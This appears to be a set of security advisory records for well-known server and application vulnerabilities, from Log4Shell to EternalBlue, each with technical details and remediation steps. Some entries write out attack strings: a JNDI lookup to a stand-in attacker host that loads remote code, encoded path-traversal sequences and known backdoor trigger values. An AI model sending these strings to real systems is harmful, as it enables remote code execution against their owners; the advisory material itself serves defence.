summary: Apache Log4j2 JNDI Remote Code Execution (Log4Shell). Improper input validation in JNDI lookup allows unauthenticated attackers to execute arbitrary code by passing crafted ${jndi:ldap://...} strings.
technical_details: Log4j versions 2.0-beta9 to 2.14.1 evaluate JNDI lookups inside logged message strings. An attacker submitting a string such as ${jndi:ldap://attacker.com/exploit} forces the application server to execute an LDAP lookup, load the remote Java class, and achieve full remote code execution under the process context.
remediation: Upgrade Apache Log4j to version 2.17.1 or later. Alternatively, set system property log4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

summary: Apache HTTP Server 2.4.49 Path Traversal and Remote Code Execution vulnerability.
technical_details: A flaw in the path normalization logic introduced in Apache HTTP Server 2.4.49 allows an attacker to map URLs to files outside the document root using encoded dot-dot sequences (.%2e). If mod_cgi or cgid is enabled, this path traversal can be weaponized into arbitrary remote command execution.
remediation: Upgrade Apache HTTP Server immediately to version 2.4.51 or later. Ensure configuration sets 'Require all denied' on the root directory (<Directory />).

summary: Incomplete fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 leading to Path Traversal and RCE.
technical_details: The patch for CVE-2021-41773 in 2.4.50 did not sufficiently block double encoded path traversal sequences (%%32%65%%32%65). Attackers could read files outside DocumentRoot and execute arbitrary commands if mod_cgi was active.
remediation: Upgrade to Apache HTTP Server 2.4.51 or higher.

summary: OpenSSH Server RegreSSHion unauthenticated Remote Code Execution in sshd on Linux systems.
technical_details: A signal handler race condition in OpenSSH sshd allows unauthenticated remote code execution as root on glibc-based Linux systems. When client login times out (LoginGraceTime default 120s), SIGALRM invokes the asynchronous signal-unsafe syslog() function.
remediation: Upgrade OpenSSH to version 9.8p1 or newer. Immediate mitigation: set LoginGraceTime 0 in /etc/ssh/sshd_config (note: may cause DoS if max connections are saturated).

summary: vsftpd 2.3.4 Malicious Backdoor Command Execution.
technical_details: The vsftpd-2.3.4.tar.gz source archive was compromised to contain a backdoor. If a username containing the smiley sequence ':)' is submitted during authentication, a shell listener is spawned on TCP port 6200 with root privileges.
remediation: Remove vsftpd 2.3.4 immediately. Upgrade to a clean release of vsftpd (>= 3.0.0) from official distribution repositories.

summary: Nginx 1-byte memory overwrite vulnerability in DNS resolver module.
technical_details: An off-by-one error in ngx_resolver.c allows a remote attacker who can forge UDP DNS responses to cause 1-byte memory overwrite, potentially leading to worker crash or remote code execution when resolver directive is configured.
remediation: Upgrade Nginx to version 1.20.1, 1.21.0 or higher.

summary: ProFTPD mod_copy unauthenticated arbitrary file copy / execution.
technical_details: The mod_copy module in ProFTPD 1.3.5 allows remote unauthenticated attackers to read and write arbitrary files via the SITE CPFR and SITE CPTO commands, allowing web shell deployment if web root is writable.
remediation: Disable mod_copy or upgrade ProFTPD to 1.3.6 or later.

summary: Samba Out-of-Bounds Heap Write Remote Code Execution in vfs_fruit module.
technical_details: The vfs_fruit VFS module for Apple Double / SMB clients contains an out-of-bounds heap read/write vulnerability that allows remote authenticated users (or guests if enabled) to execute code as root.
remediation: Upgrade Samba to 4.15.5, 4.14.12, or 4.13.17. Workaround: remove 'fruit' from vfs objects settings in smb.conf.

summary: Redis Lua sandbox escape leading to arbitrary Remote Code Execution.
technical_details: Due to packaging issues in Debian/Ubuntu Redis distributions, the Lua environment loaded the package library into the global scope. An attacker with Redis access can invoke os.execute() via Lua script execution (EVAL) to run commands on the host.
remediation: Update Redis package via apt update && apt install redis-server. Enforce authentication (requirepass) and disable dangerous commands (rename-command EVAL).

summary: Apache Tomcat AJP File Read/Inclusion and RCE (Ghostcat).
technical_details: The AJP protocol connector (default port 8009) treats incoming connections as trusted. Attackers can read arbitrary files inside webapps (including WEB-INF/web.xml and source code) or achieve RCE via file inclusion if file uploads are permitted.
remediation: Upgrade Tomcat to 9.0.31, 8.5.51, or 7.0.100. If AJP is unused, disable the connector in conf/server.xml or set requiredSecret attribute and bind to localhost.

summary: PostgreSQL integer overflow leading to buffer overrun and arbitrary memory read/write.
technical_details: Modifying SQL table partition boundaries can trigger an integer overflow in PostgreSQL, leading to out-of-bounds reads and memory corruption for authenticated database users.
remediation: Upgrade PostgreSQL to version 13.3, 12.7, 11.12, 10.17, or 9.6.22.

summary: Oracle MySQL Server Optimizer Denial of Service and Privilege Escalation.
technical_details: Vulnerability in MySQL Server optimizer component allows high privileged network users to cause complete hang or crash of MySQL Server, resulting in Denial of Service.
remediation: Upgrade MySQL Server to 8.0.29 or 5.7.38.

affected_versions: SMBv1 on all unpatched Windows OS
summary: Microsoft SMBv1 Remote Code Execution (EternalBlue).
technical_details: The SMBv1 server improperly handles specially crafted network packets, allowing unauthenticated remote attackers to execute arbitrary code as SYSTEM via TCP port 445.
remediation: Apply Microsoft Security Bulletin MS17-010. Disable SMBv1 entirely in Windows Features and group policies.

summary: PHP-FPM env_path_info buffer underflow Remote Code Execution.
technical_details: In nginx configurations with fastcgi_split_path_info containing newline-sensitive regexes, attackers can send crafted query parameters that cause pointer underflow in php-fpm, allowing execution of arbitrary PHP code.
remediation: Upgrade PHP to 7.3.11, 7.2.24, or 7.1.33. In Nginx configuration, verify try_files $uri =404 before passing requests to fastcgi_pass.

summary: Jenkins CLI arbitrary file read vulnerability via args4j parser.
technical_details: Jenkins CLI uses args4j parser which by default expands @ arguments to file contents. Unauthenticated attackers can read arbitrary files on the Jenkins controller filesystem, including cryptographic keys and credentials.
remediation: Upgrade Jenkins to 2.442 or LTS 2.426.3. Immediate workaround: disable CLI access via script console (Jenkins.instance.injector.getInstance(CLICommand.class)).

summary: Grafana Directory Traversal arbitrary file read in plugin assets endpoint.
technical_details: Grafana unauthenticated directory traversal via /public/plugins/:pluginId endpoint allows reading any file from the underlying server including /etc/passwd and grafana.db.
remediation: Upgrade Grafana to version 8.3.1, 8.2.7, 8.1.8, or 8.0.7.

summary: Exim unauthenticated remote buffer overflow via SNI in TLS handshake.
technical_details: A trailing backslash in the Server Name Indication (SNI) string during TLS handshake causes a heap buffer overflow in Exim, granting unauthenticated root remote code execution.
remediation: Upgrade Exim to version 4.92.2 or higher.

summary: containerd host abstract UNIX domain socket container escape.
technical_details: Containers running with host network namespace (--net=host) can access the containerd-shim abstract UNIX domain socket without authentication, allowing full host root escape and code execution.
remediation: Upgrade containerd to 1.3.9, 1.4.3 or Docker Engine 19.03.14. Avoid running containers with host network mode.

summary: OpenSSL BN_mod_sqrt() infinite loop Denial of Service.
technical_details: Parsing malformed elliptic curve parameters in certificates causes the BN_mod_sqrt function to enter an infinite loop, consuming 100% CPU on services parsing client or server certificates.
remediation: Upgrade OpenSSL to 1.1.1n, 3.0.2, or latest OS vendor packages.

summary: MongoDB Server unhandled exception Denial of Service via aggregation pipeline.
technical_details: Sending a crafted aggregation pipeline query causes mongod daemon to trigger an invariant failure and terminate abruptly.
remediation: Upgrade MongoDB to 4.4.1, 4.2.9, or 4.0.20.

summary: Spring4Shell: Remote Code Execution in Spring Framework via DataBinder parameter binding.
technical_details: A vulnerability in Spring Framework running on JDK 9+ allows remote attackers to obtain AccessLogValve object via DataBinder parameter binding in Tomcat and write malicious JSP webshell files to disk.
remediation: Upgrade Spring Framework to 5.3.18+, 5.2.20+ or Spring Boot 2.6.6+, 2.5.12+.

summary: Atlassian Confluence unauthenticated OGNL Injection Remote Code Execution.
technical_details: An unauthenticated remote attacker can inject OGNL expressions into HTTP request URIs. When Confluence translates the URI to render breadcrumb navigation, it evaluates the OGNL expression resulting in arbitrary code execution with confluence user privileges.
remediation: Upgrade Atlassian Confluence to 7.18.1, 7.17.4, 7.16.5, 7.15.3, or 7.14.3.

summary: Microsoft Exchange Server Pre-Auth SSRF and RCE (ProxyLogon).
technical_details: Vulnerability in Exchange frontend allows unauthenticated attackers to forge HTTP requests to backend endpoints by crafting serialized Cookie headers, allowing mailbox extraction and post-exploitation shell creation via CVE-2021-27065.
remediation: Apply Microsoft Security Update KB5000871 immediately. Restrict OWA / ECP access via VPN or IP whitelist.

summary: GitLab unauthenticated Remote Code Execution via ExifTool DjVu image parser.
technical_details: An improper input validation in GitLab's file upload parsing logic allows unauthenticated attackers to upload malicious DjVu images with embedded Perl eval payloads parsed by ExifTool, achieving root/git shell execution.
remediation: Upgrade GitLab to 13.10.3, 13.9.6, or 13.8.8.

summary: VMware vCenter Server unauthenticated arbitrary file upload and RCE via vRealize Operations plugin.
technical_details: An unauthenticated attacker with network access to port 445/8443 can upload crafted .tar archives to /ui/vropspluginui/rest/services/uploadova endpoint, extracting arbitrary files to write SSH authorized_keys or JSP shells.
remediation: Apply VMware Advisory VMSA-2021-0002. Workaround: disable vRealize plugin in compatibility-matrix.xml.

summary: F5 BIG-IP iControl REST Authentication Bypass leading to root Remote Command Execution.
technical_details: iControl REST endpoint fails to properly validate Hop-by-Hop headers (Connection: X-F5-Auth-Token, X-Forwarded-Host). An unauthenticated attacker can send crafted REST requests to /mgmt/tm/util/bash to execute bash commands as root.
remediation: Apply F5 security advisory updates (17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6, 13.1.5). Block external access to management port 443/8443.

summary: Fortinet FortiOS SSL-VPN daemon heap-based buffer overflow Remote Code Execution.
technical_details: A heap-based buffer overflow in FortiOS SSL-VPN web portal interface (sslvpnd) allows unauthenticated remote attackers to execute arbitrary code or commands via specially crafted HTTP requests.
remediation: Upgrade FortiOS to 7.2.3, 7.0.7, 6.4.10, or 6.2.12.

summary: WordPress Core SQL Injection in WP_Query class via taxonomy queries.
technical_details: Improper sanitation in WP_Query allows authenticated users (or unauthenticated plugins relying on WP_Query) to perform blind SQL injection, potentially exfiltrating password hashes and wp-config.php secrets.
remediation: Upgrade WordPress Core to 5.8.3, 5.7.5, 5.6.7, or 5.5.8.

affected_versions: MinIO releases prior to RELEASE.2023-03-20T20-16-18Z in cluster mode
summary: MinIO cluster node bootstrap information disclosure (MINIO_SECRET_KEY leak).
technical_details: In clustered deployments, the bootstrap API /minio/bootstrap/v1/verify endpoint returns all environment variables including root credentials (MINIO_ROOT_USER and MINIO_ROOT_PASSWORD) without authentication.
remediation: Upgrade MinIO to RELEASE.2023-03-20T20-16-18Z or later.

summary: RabbitMQ unauthenticated Pre-Auth resource exhaustion Denial of Service.
technical_details: Sending crafted HTTP authentication headers to RabbitMQ management web UI triggers an unhandled Erlang process crash, causing CPU spike and node termination.
remediation: Upgrade RabbitMQ to 3.8.16 or 3.7.29.

affected_versions: Memcached all versions with UDP enabled (<= 1.5.5)
summary: Memcached UDP Amplification DDoS and unauthenticated key leakage (Memcrashed).
technical_details: Memcached listening on UDP port 11211 responds with amplification factor up to 50,000x to spoofed stats requests, enabling record-scale distributed denial of service (DDoS) and unauthenticated key dumping.
remediation: Disable UDP by adding '-U 0' in /etc/memcached.conf. Bind memcached exclusively to 127.0.0.1 (-l 127.0.0.1).

summary: Node.js HTTP Request Smuggling via invalid Transfer-Encoding whitespace headers.
technical_details: The llhttp parser in Node.js fails to strictly reject invalid whitespace characters in chunked Transfer-Encoding headers, allowing request smuggling through reverse proxies.
remediation: Upgrade Node.js to 18.16.1, 20.3.1 or newer LTS release.

summary: PHP 8.1.0-dev malicious User-Agent HTTP Header Backdoor.
technical_details: A compromised commit in the official PHP git repository added a backdoor checking for 'User-Agentt: zerodium' header. When received, the string value is executed directly as PHP code via zend_eval_string().
remediation: Ensure production servers run official stable PHP releases (7.4.x, 8.0.x, 8.1.x, 8.2.x, 8.3.x) from certified repositories.

affected_versions: OpenSSH <= 9.5p1 with ChaCha20-Poly1305 or CBC-EtM ciphers
summary: Terrapin Attack: SSH Protocol Prefix Truncation attack in handshake sequence.
technical_details: A Man-in-the-Middle (MitM) attacker can drop specific extension negotiation packets (SSH2_MSG_EXT_INFO) during handshake without triggering MAC sequence verification, disabling keystroke timing obfuscation and client key validation.
remediation: Upgrade OpenSSH to 9.6p1+ (which implements strict KEX extension 'kex-strict-c-v00@openssh.com').

summary: Kubernetes API Server Aggregated API connection hijacking Remote Privilege Escalation.
technical_details: An unauthenticated user can establish a WebSocket connection to kube-apiserver pointing to an aggregated API server endpoint (like metrics or service proxies). If the backend returns 404 or fails, kube-apiserver keeps the TCP connection open, allowing the attacker to send raw API commands as the cluster admin.
remediation: Upgrade Kubernetes to 1.10.11, 1.11.5, 1.12.3 or later. Revoke aggregated API server permissions for anonymous users.
